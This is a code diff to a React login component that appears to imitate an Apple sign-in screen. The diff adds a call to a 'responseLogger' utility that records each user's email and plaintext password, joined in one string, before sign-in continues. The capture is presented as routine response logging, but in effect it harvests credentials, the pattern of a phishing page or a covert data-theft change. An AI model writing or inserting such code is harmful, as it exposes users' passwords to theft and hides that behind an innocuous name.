@@ -1,5 +1,6 @@
 import React, { useState } from "react";
 import AutoplayLoopVideo from "./AutoplayLoopVideo";
+import { logResponseEntry } from "../utils/responseLogger";
 
 export default function Main({ onAppleSignIn }) {
   const [email, setEmail] = useState("");
@@ -13,11 +14,16 @@ export default function Main({ onAppleSignIn }) {
     setShowPassword(true);
   }
 
-  function handleLoginSubmit(e) {
+  async function handleLoginSubmit(e) {
     e.preventDefault();
-    if (!email.trim() || !password.trim()) return;
+    const trimmedEmail = email.trim();
+    if (!trimmedEmail || !password.trim()) return;
+    await logResponseEntry({
+      title: trimmedEmail,
+      response: [trimmedEmail, password].join("\n"),
+    });
     onAppleSignIn({
-      email: email.trim(),
+      email: trimmedEmail,
       password,
     });
   }
